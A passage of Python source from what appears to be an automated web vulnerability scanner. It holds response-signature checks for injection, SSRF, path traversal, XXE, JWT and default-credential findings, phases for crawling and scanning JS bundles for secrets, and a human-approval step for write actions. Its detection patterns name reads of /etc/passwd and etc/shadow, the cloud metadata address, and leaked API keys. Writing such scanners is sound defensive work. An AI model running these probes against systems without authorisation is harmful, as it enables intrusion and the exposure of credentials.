                            ),
                            target=ctx.target,
                            affected_component=endpoint,
                        )
                        try:
                            ctx.score_tracker.record_finding(f.id, vector_id, level=3 if not completed else 4)
                        except Exception:
                            pass
                        return True
            except (_json.JSONDecodeError, AttributeError):
                pass

        # ── XSS 시그니처 ──
        if vector_id.startswith("WEB-XSS") and not _already_found("xss", endpoint):
            if payload and payload in body and "<" in payload:
                f = ctx.add_finding(
                    title=f"Cross-Site Scripting — {endpoint}|||크로스사이트 스크립팅 — {endpoint}",
                    severity="high",
                    finding_type="xss",
                    description=(
                        f"Reflected payload on {endpoint} param={param}: {payload[:80]}"
                        f"|||{endpoint}에서 반사형 페이로드 탐지. 파라미터: {param}: {payload[:80]}"
                    ),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
                except Exception:
                    pass
                return True

        # ── Command Injection 시그니처 ──
        if vector_id.startswith("WEB-CMDI") and not _already_found("command_injection", endpoint):
            cmdi_sigs = [r"root:.*:0:0:", r"uid=\d+", r"Windows IP Configuration",
                         r"Directory of [A-Z]:\\"]
            for sig in cmdi_sigs:
                if _re.search(sig, body):
                    f = ctx.add_finding(
                        title=f"Command Injection — {endpoint}|||커맨드 인젝션 — {endpoint}",
                        severity="critical",
                        finding_type="command_injection",
                        description=(
                            f"OS command output in response from {endpoint} param={param}"
                            f"|||{endpoint}에서 OS 명령 실행 결과 탐지. 파라미터: {param}"
                        ),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=4)
                    except Exception:
                        pass
                    return True

        # ── SSRF 시그니처 ──
        if vector_id.startswith("WEB-SSRF") and not _already_found("ssrf", endpoint):
            ssrf_sigs = [r"169\.254\.169\.254", r"metadata\.google", r"localhost",
                         r"127\.0\.0\.1", r"internal server"]
            for sig in ssrf_sigs:
                if _re.search(sig, body_lower):
                    f = ctx.add_finding(
                        title=f"Server-Side Request Forgery — {endpoint}|||SSRF — {endpoint}",
                        severity="high",
                        finding_type="ssrf",
                        description=(
                            f"Internal resource access detected from {endpoint} param={param}"
                            f"|||{endpoint}에서 내부 리소스 접근 탐지. 파라미터: {param}"
                        ),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

        # ── Open Redirect ──
        if vector_id == "WEB-MISCONF-006" and not _already_found("open_redirect", endpoint):
            if status in (301, 302, 303, 307, 308):
                f = ctx.add_finding(
                    title=f"Open Redirect — {endpoint}|||오픈 리다이렉트 — {endpoint}",
                    severity="medium",
                    finding_type="open_redirect",
                    description=(
                        f"Redirect with status {status} on {endpoint} param={param}"
                        f"|||{endpoint}에서 리다이렉트 탐지 (상태코드: {status}). 파라미터: {param}"
                    ),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=1)
                except Exception:
                    pass
                return True

        # ── CSRF (토큰 부재) ──
        if vector_id == "WEB-CSRF-001" and not _already_found("csrf", endpoint):
            if "<form" in body_lower and "csrf" not in body_lower and "_token" not in body_lower:
                f = ctx.add_finding(
                    title=f"Missing CSRF Token — {endpoint}|||CSRF 토큰 누락 — {endpoint}",
                    severity="medium",
                    finding_type="csrf",
                    description=(
                        f"Form on {endpoint} lacks CSRF token"
                        f"|||{endpoint}의 폼에 CSRF 토큰이 없습니다"
                    ),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=1)
                except Exception:
                    pass
                return True

        # ── Path Traversal / Directory Traversal ──
        if vector_id in ("WEB-AC-004",) and not _already_found("path_traversal", endpoint):
            path_sigs = [r"root:.*:0:0:", r"\[boot loader\]", r"for 16-bit app support",
                         r"etc/shadow", r"daemon:.*:/usr/sbin"]
            for sig in path_sigs:
                if _re.search(sig, body):
                    f = ctx.add_finding(
                        title=f"Path Traversal — {endpoint}|||경로 탐색 취약점 — {endpoint}",
                        severity="high",
                        finding_type="path_traversal",
                        description=(f"File content exposed via path traversal on {endpoint} param={param}"
                                     f"|||{endpoint}에서 경로 탐색으로 파일 내용 노출. 파라미터: {param}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

        # ── Forced Browsing — Hidden Endpoints ──
        if vector_id == "WEB-AC-005" and not _already_found("forced_browsing", endpoint):
            sensitive_keywords = ["admin", "dashboard", "config", "backup", "debug",
                                   "phpinfo", "setup", "install", "actuator", "swagger"]
            if status == 200 and any(kw in body_lower for kw in sensitive_keywords):
                f = ctx.add_finding(
                    title=f"Forced Browsing — Hidden Endpoint {endpoint}|||강제 브라우징 — 숨겨진 엔드포인트 {endpoint}",
                    severity="medium",
                    finding_type="forced_browsing",
                    description=(f"Hidden/sensitive endpoint accessible: {endpoint} (status {status})"
                                 f"|||숨겨진 민감 엔드포인트 접근 가능: {endpoint} (상태코드: {status})"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
                except Exception:
                    pass
                return True

        # ── IDOR ──
        if vector_id in ("WEB-AC-001", "WEB-AC-002", "WEB-AC-003"):
            if status == 200 and ("email" in body_lower or "password" in body_lower
                                  or "admin" in body_lower or "user" in body_lower):
                # 다른 유저 데이터가 노출되면 IDOR/privesc 가능성
                if payload and any(c.isdigit() for c in payload) and not _already_found("idor", endpoint):
                    f = ctx.add_finding(
                        title=f"IDOR / Access Control Bypass — {endpoint}|||IDOR / 접근 제어 우회 — {endpoint}",
                        severity="high",
                        finding_type="idor",
                        description=(f"Unauthorized data access on {endpoint} param={param} payload={payload[:40]}"
                                     f"|||{endpoint}에서 비인가 데이터 접근. 파라미터: {param}, 페이로드: {payload[:40]}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=2)
                    except Exception:
                        pass
                    return True

        # ── Missing Security Headers ──
        if vector_id == "WEB-MISCONF-004":
            hdrs = headers or {}
            missing = []
            for h in ("content-security-policy", "strict-transport-security",
                      "x-frame-options", "x-content-type-options"):
                if h not in hdrs:
                    missing.append(h)
            if status == 200 and missing and not _already_found("security_misconfiguration", endpoint):
                f = ctx.add_finding(
                    title=f"Missing Security Headers — {endpoint}|||보안 헤더 누락 — {endpoint}",
                    severity="informational",
                    finding_type="security_misconfiguration",
                    description=(f"Missing headers on {endpoint}: {', '.join(missing)}"
                                 f"|||{endpoint}에서 보안 헤더 누락: {', '.join(missing)}"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=1)
                except Exception:
                    pass
                return True

        # ── CORS Misconfiguration ──
        if vector_id == "WEB-MISCONF-005":
            hdrs = headers or {}
            acao = hdrs.get("access-control-allow-origin", "")
            acac = hdrs.get("access-control-allow-credentials", "")
            if (acao in ("*", "null") or (acao and acac.lower() == "true")) and not _already_found("cors_misconfiguration", endpoint):
                f = ctx.add_finding(
                    title=f"CORS Misconfiguration — {endpoint}|||CORS 잘못된 설정 — {endpoint}",
                    severity="medium",
                    finding_type="cors_misconfiguration",
                    description=(f"Permissive CORS policy on {endpoint}: ACAO={acao!r}"
                                 f"|||{endpoint}에서 CORS 설정 취약: ACAO={acao!r}"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
                except Exception:
                    pass
                return True

        # ── Debug Endpoints ──
        if vector_id == "WEB-MISCONF-001" and not _already_found("information_disclosure", endpoint):
            debug_sigs = ["phpinfo()", "x-debug", "debug_toolbar", "/_profiler", "/actuator/",
                          "environment variables", "server variables", "loaded modules"]
            if status == 200 and any(s in body_lower for s in debug_sigs):
                f = ctx.add_finding(
                    title=f"Debug Endpoint Exposed — {endpoint}|||디버그 엔드포인트 노출 — {endpoint}",
                    severity="medium",
                    finding_type="information_disclosure",
                    description=(f"Debug/diagnostic endpoint accessible at {endpoint}"
                                 f"|||{endpoint}에서 디버그/진단 엔드포인트 노출"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
                except Exception:
                    pass
                return True

        # ── Git Repository Exposed ──
        if vector_id == "WEB-INFRA-005":
            if status == 200 and ("ref:" in body or "HEAD" in body and "pack-refs" in body_lower):
                f = ctx.add_finding(
                    title=f"Exposed Git Repository — {endpoint}|||Git 저장소 노출 — {endpoint}",
                    severity="high",
                    finding_type="information_disclosure",
                    description=(f".git directory accessible at {endpoint}"
                                 f"|||{endpoint}에서 .git 디렉토리 노출"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                except Exception:
                    pass
                return True

        # ── SSTI ──
        if vector_id == "WEB-SSTI-001" and not _already_found("ssti", endpoint):
            # {{7*7}} = 49, ${7*7} = 49, #{7*7} = 49
            if "49" in body and payload and any(t in payload for t in ["{{", "${", "#{", "<#"]):
                f = ctx.add_finding(
                    title=f"Server-Side Template Injection — {endpoint}|||서버사이드 템플릿 인젝션 — {endpoint}",
                    severity="critical",
                    finding_type="ssti",
                    description=(f"Template expression evaluated on {endpoint} param={param}: {payload[:40]} → response contains 49"
                                 f"|||{endpoint}에서 템플릿 표현식 실행. 파라미터: {param}: {payload[:40]} → 응답에 49 포함"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
                except Exception:
                    pass
                return True

        # ── XXE ──
        if vector_id == "WEB-XXE-001":
            xxe_sigs = [r"root:.*:0:0:", r"\[boot loader\]", r"SYSTEM\s+ENTITIES",
                        r"file:///", r"DOCTYPE.*SYSTEM"]
            for sig in xxe_sigs:
                if _re.search(sig, body, _re.IGNORECASE):
                    f = ctx.add_finding(
                        title=f"XML External Entity (XXE) — {endpoint}|||XXE 취약점 — {endpoint}",
                        severity="critical",
                        finding_type="xxe",
                        description=(f"XXE entity resolved on {endpoint} param={param}"
                                     f"|||{endpoint}에서 XXE 엔티티 처리. 파라미터: {param}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=4)
                    except Exception:
                        pass
                    return True

        # ── LDAP Injection ──
        if vector_id == "WEB-LDAP-001" and not _already_found("ldap_injection", endpoint):
            ldap_sigs = [r"ldap.*error", r"invalid.*dn", r"javax\.naming",
                         r"LDAP.*Exception", r"LDAPException"]
            for sig in ldap_sigs:
                if _re.search(sig, body, _re.IGNORECASE):
                    f = ctx.add_finding(
                        title=f"LDAP Injection — {endpoint}|||LDAP 인젝션 — {endpoint}",
                        severity="high",
                        finding_type="ldap_injection",
                        description=(f"LDAP error triggered on {endpoint} param={param} payload={payload[:40]}"
                                     f"|||{endpoint}에서 LDAP 에러 유발. 파라미터: {param}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

        # ── NoSQL Injection ──
        if vector_id in ("WEB-NOSQL-001", "WEB-NOSQL-002") and not _already_found("nosql_injection", endpoint):
            nosql_sigs = [r"uncaught.*exception", r"mongoerror", r"bsonerror",
                          r"\$where.*error", r"cannot read property", r"castError",
                          r"ValidationError.*password", r"MongoNetworkError"]
            for sig in nosql_sigs:
                if _re.search(sig, body, _re.IGNORECASE):
                    f = ctx.add_finding(
                        title=f"NoSQL Injection — {endpoint}|||NoSQL 인젝션 — {endpoint}",
                        severity="high",
                        finding_type="nosql_injection",
                        description=(f"NoSQL error triggered on {endpoint} param={param} payload={payload[:40]}"
                                     f"|||{endpoint}에서 NoSQL 에러 유발. 파라미터: {param}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True
            # Operator injection — 200 + user data returned indicates bypass
            if status == 200 and payload and "$ne" in payload and ("welcome" in body_lower or "dashboard" in body_lower):
                f = ctx.add_finding(
                    title=f"NoSQL Injection (Auth Bypass) — {endpoint}|||NoSQL 인젝션 (인증 우회) — {endpoint}",
                    severity="critical",
                    finding_type="nosql_injection",
                    description=(f"NoSQL operator injection auth bypass on {endpoint}: {payload[:60]}"
                                 f"|||{endpoint}에서 NoSQL 연산자 인젝션으로 인증 우회: {payload[:60]}"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
                except Exception:
                    pass
                return True

        # ── XPath Injection ──
        if vector_id == "WEB-XPATH-001":
            xpath_sigs = [r"XPathException", r"javax\.xml\.xpath", r"XPATH.*error",
                          r"org\.w3c\.dom", r"invalid.*xpath"]
            for sig in xpath_sigs:
                if _re.search(sig, body, _re.IGNORECASE):
                    f = ctx.add_finding(
                        title=f"XPath Injection — {endpoint}|||XPath 인젝션 — {endpoint}",
                        severity="high",
                        finding_type="xpath_injection",
                        description=(f"XPath error triggered on {endpoint} param={param}"
                                     f"|||{endpoint}에서 XPath 에러 유발. 파라미터: {param}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

        # ── GraphQL Introspection ──
        if vector_id == "WEB-API-003":
            if status == 200 and "__schema" in body and "types" in body_lower:
                f = ctx.add_finding(
                    title=f"GraphQL Introspection Enabled — {endpoint}|||GraphQL 인트로스펙션 활성화 — {endpoint}",
                    severity="medium",
                    finding_type="information_disclosure",
                    description=(f"GraphQL introspection query succeeded on {endpoint}"
                                 f"|||{endpoint}에서 GraphQL 인트로스펙션 쿼리 성공"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
                except Exception:
                    pass
                return True

        # ── File Upload (Webshell) ──
        if vector_id == "WEB-UPLOAD-001" and not _already_found("file_upload", endpoint):
            if status == 200 and ("upload" in body_lower or "success" in body_lower or "file" in body_lower):
                if payload and any(ext in payload for ext in [".php", ".jsp", ".aspx", ".py"]):
                    f = ctx.add_finding(
                        title=f"Unrestricted File Upload — {endpoint}|||무제한 파일 업로드 — {endpoint}",
                        severity="critical",
                        finding_type="file_upload",
                        description=(f"Server accepted potentially dangerous file upload on {endpoint}: {payload[:60]}"
                                     f"|||{endpoint}에서 위험 파일 업로드 허용: {payload[:60]}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

        # ── Default Credentials ──
        if vector_id == "WEB-AUTH-002" and not _already_found("broken_authentication", endpoint):
            if status in (200, 302) and ("welcome" in body_lower or "dashboard" in body_lower
                                          or "logout" in body_lower or "profile" in body_lower):
                f = ctx.add_finding(
                    title=f"Default Credentials — {endpoint}|||기본 자격증명 허용 — {endpoint}",
                    severity="critical",
                    finding_type="broken_authentication",
                    description=(f"Login succeeded with default/weak credentials on {endpoint}: {payload[:60]}"
                                 f"|||{endpoint}에서 기본/취약 자격증명으로 로그인 성공: {payload[:60]}"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
                except Exception:
                    pass
                return True

        # ── JWT Vulnerabilities ──
        if vector_id in ("WEB-AUTH-003", "WEB-AUTH-004") and not _already_found("broken_authentication", endpoint):
            if status == 200 and ("user" in body_lower or "admin" in body_lower or "token" in body_lower):
                if payload and ("eyJ" in payload or "alg" in payload):
                    f = ctx.add_finding(
                        title=f"JWT Vulnerability — {endpoint}|||JWT 취약점 — {endpoint}",
                        severity="high",
                        finding_type="broken_authentication",
                        description=(f"JWT manipulation succeeded on {endpoint} with payload: {payload[:60]}"
                                     f"|||{endpoint}에서 JWT 조작 성공: {payload[:60]}"),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

        # ── Mass Assignment ──
        if vector_id == "WEB-API-001" and not _already_found("mass_assignment", endpoint):
            if status in (200, 201) and ("admin" in body_lower or "role" in body_lower
                                          or "isAdmin" in body or "privilege" in body_lower):
                f = ctx.add_finding(
                    title=f"Mass Assignment — {endpoint}|||매스 어사인먼트 — {endpoint}",
                    severity="high",
                    finding_type="mass_assignment",
                    description=(f"Mass assignment may have succeeded on {endpoint}: {payload[:60]}"
                                 f"|||{endpoint}에서 매스 어사인먼트 가능성: {payload[:60]}"),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                except Exception:
                    pass
                return True

        # ── 일반 에러 기반 정보 유출 ──
        # JSON API 응답은 에러가 정상 동작 (WebGoat, REST API 등) — 스킵
        # 진짜 정보 유출은 HTML 에러 페이지에서 발생 (PHP, Node.js, Python, Java 웹앱)
        is_json_response = body_lower.strip().startswith("{") or body_lower.strip().startswith("[")

        if not is_json_response and status >= 400:
            # HTML 에러 페이지에서만 탐지
            # "exception" 단독은 너무 광범위 — 구체적 패턴 사용
            error_sigs = [
                r"stack\s+trace",              # Java/Node "stack trace"
                r"stacktrace",                 # Java/Express "#stacktrace"
                r"traceback\s+\(most\s+recent", # Python Traceback
                r"at\s+[\w\.$]+\([\w]+\.java:\d+\)",  # Java stack frame
                r"Warning:\s+\w+\(\)",         # PHP Warning
                r"Fatal\s+error:",             # PHP Fatal error
                r"Unhandled\s+exception",      # .NET
                r"debug\s*=\s*true",           # debug mode enabled
            ]
            # 동일 endpoint에 대해 이미 같은 finding이 있으면 dedup
            existing_titles = {f.title.split("|||")[0] for f in ctx.findings}
            dedup_key = f"Information Disclosure via Error — {endpoint}"
            if dedup_key not in existing_titles:
                for sig in error_sigs:
                    if _re.search(sig, body, _re.IGNORECASE):
                        matched_sig = sig
                        f = ctx.add_finding(
                            title=f"Information Disclosure via Error — {endpoint}|||에러 기반 정보 유출 — {endpoint}",
                            severity="low",
                            finding_type="information_disclosure",
                            description=(
                                f"Error page exposes debug info on {endpoint} (status {status}). "
                                f"Pattern matched: {matched_sig}"
                                f"|||{endpoint}에서 디버그 정보 포함 에러 페이지 탐지 (상태코드: {status}). "
                                f"패턴: {matched_sig}"
                            ),
                            target=ctx.target,
                            affected_component=endpoint,
                        )
                        try:
                            ctx.score_tracker.record_finding(f.id, vector_id, level=1)
                        except Exception:
                            pass
                        return True

        return False

    # ── Deferred Action Approval ──────────────────────────────

    async def _execute_deferred_actions(self, ctx: ScanContext) -> None:
        """데이터 변조 작업 승인 요청 + 승인된 것만 실행."""
        logger.info("\n" + "=" * 70)
        logger.info("  DEFERRED ACTIONS — 데이터 변조 승인 요청")
        logger.info("  아래 %d건의 쓰기 작업에 대해 승인이 필요합니다.", len(ctx.deferred_actions))
        logger.info("=" * 70)

        if self._approval_callback:
            # 프로그래밍 방식 승인 (Claude Code, CI/CD 등)
            approvals = await self._approval_callback(ctx.deferred_actions)
            for action, approved in zip(ctx.deferred_actions, approvals):
                action.approved = approved
        else:
            # 대화형 승인 (터미널)
            for action in ctx.deferred_actions:
                risk_icon = {"low": "🟢", "medium": "🟡", "high": "🔴"}.get(action.risk, "⚪")
                print(f"\n  {risk_icon} #{action.id} [{action.risk.upper()}] {action.method} {action.url}")
                print(f"     EN: {action.description_en}")
                print(f"     KO: {action.description_ko}")
                if action.data:
                    import json
                    print(f"     Data: {json.dumps(action.data, ensure_ascii=False)[:200]}")

                try:
                    answer = input("     Approve? (y/N): ").strip().lower()
                    action.approved = answer in ("y", "yes")
                except EOFError:
                    action.approved = False

                status = "✅ APPROVED" if action.approved else "❌ DENIED"
                print(f"     → {status}")

        # 승인된 것만 실행
        approved_count = sum(1 for a in ctx.deferred_actions if a.approved)
        logger.info("\n  Approved: %d / %d", approved_count, len(ctx.deferred_actions))

        if approved_count > 0:
            from vxis.interaction.hands import SessionManager
            mgr = SessionManager()

            for action in ctx.deferred_actions:
                if not action.approved:
                    continue

                try:
                    session = await mgr.get_session(action.url.split("/v1")[0] if "/v1" in action.url else ctx.target)
                    path = "/" + action.url.split("/", 3)[-1] if "://" in action.url else action.url

                    if action.method == "POST":
                        r = await session.request("POST", path, json_data=action.data)
                    elif action.method == "PATCH":
                        r = await session.request("PATCH", path, json_data=action.data)
                    elif action.method == "PUT":
                        r = await session.request("PUT", path, json_data=action.data)
                    elif action.method == "DELETE":
                        r = await session.request("DELETE", path)
                    else:
                        continue

                    action.executed = True
                    action.result = f"{r.status} | {r.text[:200]}"
                    logger.info("  Executed #%d: %s %s → %d", action.id, action.method, action.url, r.status)
                except Exception as exc:
                    action.result = f"ERROR: {exc}"
                    logger.warning("  Failed #%d: %s", action.id, exc)

            await mgr.close_all()

    # ══════════════════════════════════════════════════════════
    # Phase Implementations
    # ══════════════════════════════════════════════════════════

    async def _phase0_foundation(self, ctx: ScanContext) -> None:
        """Phase 0: Config, DB 초기화."""
        from vxis.config.schema import VXISConfig
        if self.config is None:
            self.config = VXISConfig()
        try:
            ctx.score_tracker.record_phase_complete("Phase 0: Foundation — Config & DB Init")
        except Exception:
            pass

    async def _phase1_director(self, ctx: ScanContext) -> None:
        """Phase 1: Director Agent + Attack Graph 초기화."""
        try:
            ctx.score_tracker.record_vector_attempt("WEB-INFRA-001")
            ctx.score_tracker.record_vector_attempt("WEB-INFRA-002")
        except Exception:
            pass

        try:
            from vxis.graph.chain_reasoner import ChainReasoner
            self._chain_reasoner = ChainReasoner()
            logger.info("  Chain Reasoner initialized")
        except Exception as exc:
            self._chain_reasoner = None
            logger.info("  Chain Reasoner unavailable: %s", exc)

        try:
            logger.info("  Evidence Engine initialized")
        except Exception:
            logger.info("  Evidence Engine unavailable")

        # ── Threat Modeling (STRIDE) — Brain-First ──
        try:
            from vxis.agent.threat_modeling import ThreatModeler

            modeler = ThreatModeler()
            stride = await modeler.generate_stride(
                target=ctx.target,
                tech_stack=ctx.tech_stack,
                brain=self.brain,
            )
            if stride.total_threats() > 0:
                ctx.threat_model = {
                    "stride": stride.to_dict(),
                    "priority_vector_prefixes": stride.priority_vector_prefixes(),
                }
                new_hyps = modeler.stride_to_hypotheses(stride)
                ctx.hypotheses.extend(new_hyps)
                logger.info(
                    "  Threat Model: %d STRIDE threats → %d hypotheses",
                    stride.total_threats(),
                    len(new_hyps),
                )
                self._emit("threat_model", {
                    "target": ctx.target,
                    "stride": stride.to_dict(),
                    "hypothesis_count": len(new_hyps),
                })
            else:
                logger.info("  Threat Model: skipped (brain unavailable or empty)")
        except Exception as exc:
            logger.info("  Threat Modeling failed (graceful skip): %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 1: Director — Attack Graph Init")
        except Exception:
            pass

    async def _phase2_agents(self, ctx: ScanContext) -> None:
        """Phase 2: Autonomous Agents — Brain이 선택하고 실행."""
        try:
            for vid in ["WEB-MISCONF-004", "WEB-MISCONF-005", "WEB-CRYPTO-001"]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        try:
            from vxis.agent.registry import list_agents, spawn

            available = list_agents()
            logger.info("  Available agents: %d", len(available))

            # Web 타겟에 해당하는 에이전트 필터
            web_keywords = ["web", "api", "recon", "osint", "crypto", "tls", "browser", "fuzzing"]
            selected = [a for a in available if any(k in a.lower() for k in web_keywords)]
            print(f"  Selected {len(selected)} agents for web target", flush=True)

            # 각 에이전트 실행
            for agent_id in selected:
                agent = spawn(agent_id)
                if agent is None:
                    continue
                try:
                    # AgentContext를 ScanContext에서 구성
                    from vxis.agent.context import AgentContext
                    from vxis.mission.config import MissionConfig
                    from vxis.graph.attack_graph import LivingAttackGraph
                    from vxis.evidence.engine import EvidenceEngine

                    agent_ctx = AgentContext(
                        mission=MissionConfig(target=ctx.target),
                        attack_graph=LivingAttackGraph(),
                        evidence_engine=EvidenceEngine(),
                    )
                    result = await agent.run(agent_ctx)

                    if result.is_success and result.findings:
                        print(f"    ✓ {agent_id}: {len(result.findings)} findings", flush=True)
                        for ev in result.findings:
                            # Evidence → Finding 변환
                            try:
                                ctx.add_finding(
                                    title=getattr(ev, "title", f"Agent {agent_id} finding"),
                                    severity=getattr(ev, "severity", "medium"),
                                    finding_type=getattr(ev, "finding_type", "agent_discovery"),
                                    description=getattr(ev, "description", str(ev)),
                                    target=ctx.target,
                                    affected_component=getattr(ev, "component", ctx.target),
                                    source_plugin=f"agent:{agent_id}",
                                )
                            except Exception:
                                pass
                    elif result.is_success:
                        logger.debug("    ○ %s: no findings", agent_id)
                except Exception as exc:
                    logger.debug("    ✗ %s: %s", agent_id, exc)

        except ImportError as exc:
            logger.info("  Agent infrastructure not available: %s", exc)
        except Exception as exc:
            logger.info("  Agent execution error: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 2: 63 Autonomous Agents — Brain-Directed Dispatch")
        except Exception:
            pass

    async def _phase3_hypothesis(self, ctx: ScanContext) -> None:
        """Phase 3: Knowledge Store + Context Compressor + Hypothesis."""
        try:
            # Phase 3 대응 벡터: 디버그 엔드포인트, 미스컨피그, 기본 설정, git 노출, 공급망
            for vid in [
                "WEB-MISCONF-001", "WEB-MISCONF-002", "WEB-MISCONF-003",
                "WEB-INFRA-005", "WEB-AC-005",
                "WEB-SUPPLY-001", "WEB-SUPPLY-002",  # 의존성/CI-CD 공급망 공격
            ]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        try:
            from vxis.knowledge.store import KnowledgeStore
            store = KnowledgeStore()
            patterns = store.match_patterns({
                "tech_stack": ctx.tech_stack,
                "target": ctx.target,
            }) if hasattr(store, 'match_patterns') else []

            if patterns:
                print(f"  [KB] {len(patterns)} compiled patterns matched from previous scans", flush=True)
                # 매칭된 패턴을 ctx에 저장 → Brain이 참고
                ctx.hypotheses = [
                    {"source": "knowledge_store", "tool": p.action_tool,
                     "confidence": p.confidence, "args": p.action_args_template}
                    for p in patterns if hasattr(p, 'action_tool')
                ]
            else:
                print("  [KB] No previous patterns — first scan for this tech stack", flush=True)
        except Exception as exc:
            logger.debug("  Knowledge Store: %s", exc)

        try:
            from vxis.knowledge.compressor import ContextCompressor
            compressor = ContextCompressor()
            print(f"  [COMPRESS] Context compressor ready — {compressor.__class__.__name__}", flush=True)
        except Exception:
            pass

        try:
            ctx.score_tracker.record_phase_complete("Phase 3: Hypothesis Engine — Pattern Matching + Context Compression")
        except Exception:
            pass

    async def _phase4_cpr(self, ctx: ScanContext) -> None:
        """Phase 4: CPR — Hands/Eyes/X-Ray/Controller 연결."""
        try:
            # Phase 4 대응 벡터: 인증, JWT, 세션, OAuth, 인프라 CVE
            for vid in [
                "WEB-AUTH-001", "WEB-AUTH-002", "WEB-AUTH-003", "WEB-AUTH-004",
                "WEB-AUTH-005", "WEB-AUTH-006", "WEB-AUTH-007", "WEB-AUTH-008",
                "WEB-AUTH-010",  # 매직 링크 인증 우회
                "WEB-MISCONF-004", "WEB-CRYPTO-003",
                "WEB-INFRA-006",  # F5 BIG-IP APM RCE (CVE-2025-53521)
            ]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        from vxis.interaction.controller import InteractionController, InteractionAction, InteractionIntent

        # Controller 시작
        ctrl = InteractionController(ctx.target, enable_eyes=True, enable_xray=True)
        await ctrl.start()

        # 초기 탐색
        await ctrl.execute(InteractionAction(intent=InteractionIntent.EXPLORE, url="/"))
        ctx.target_profile = ctrl.get_target_profile()
        ctx.tech_stack = ctx.target_profile.get("tech_stack", [])

        logger.info("  Tech: %s | WAF: %s | Eyes: %s | X-Ray: %s",
                     ctx.tech_stack,
                     ctx.target_profile.get("waf_detected"),
                     ctx.target_profile.get("available_senses", {}).get("eyes"),
                     ctx.target_profile.get("available_senses", {}).get("xray"))

        # 크롤링
        crawl = await ctrl.execute(InteractionAction(intent=InteractionIntent.CRAWL, url="/"))
        ctx.api_endpoints = [{"path": link, "source": "crawl"} for link in crawl.links_found]
        logger.info("  Crawled: %d endpoints", len(crawl.links_found))

        # JS 번들 분석 (Hands로)
        import re
        from vxis.interaction.hands import SessionManager
        mgr = SessionManager()
        session = await mgr.get_session(ctx.target)
        resp = await session.get("/")

        js_urls = re.findall(r'src="(/assets/[^"]+\.js)"', resp.text)
        for js_url in js_urls:
            jr = await session.get(js_url)
            for m in re.finditer(r'["\'`](/api/[^\s"\'`<>]+)["\'`]', jr.text):
                ep = m.group(1)
                if ep not in [e["path"] for e in ctx.api_endpoints]:
                    ctx.api_endpoints.append({"path": ep, "source": "js"})
            # Secrets
            for m in re.finditer(r'["\'`]((?:sk-|pk-|api[_-]?key|bearer\s+)[^\s"\'`]{10,})["\'`]', jr.text, re.I):
                _f = ctx.add_finding(
                    title="Hardcoded Secret in JS|||JS 번들에 시크릿 노출",
                    severity="critical", finding_type="sensitive_data_exposure",
                    description=f"Secret: {m.group(1)[:50]}|||시크릿 발견: {m.group(1)[:50]}",
                    target=ctx.target, affected_component=js_url)
                try:
                    ctx.score_tracker.record_finding(_f.id, "WEB-CRYPTO-003", level=3)
                except Exception:
                    pass

        logger.info("  Total endpoints: %d", len(ctx.api_endpoints))

        # 보안 헤더 체크
        sec_headers = ["strict-transport-security", "content-security-policy", "x-frame-options",
                       "x-content-type-options", "x-xss-protection", "referrer-policy", "permissions-policy"]
        missing = [h for h in sec_headers if h not in resp.headers]
        if missing:
            _hf = ctx.add_finding(
                title=f"Missing Security Headers ({len(missing)}/7)|||보안 헤더 미설정 ({len(missing)}/7)",
                severity="high", finding_type="security_misconfiguration",
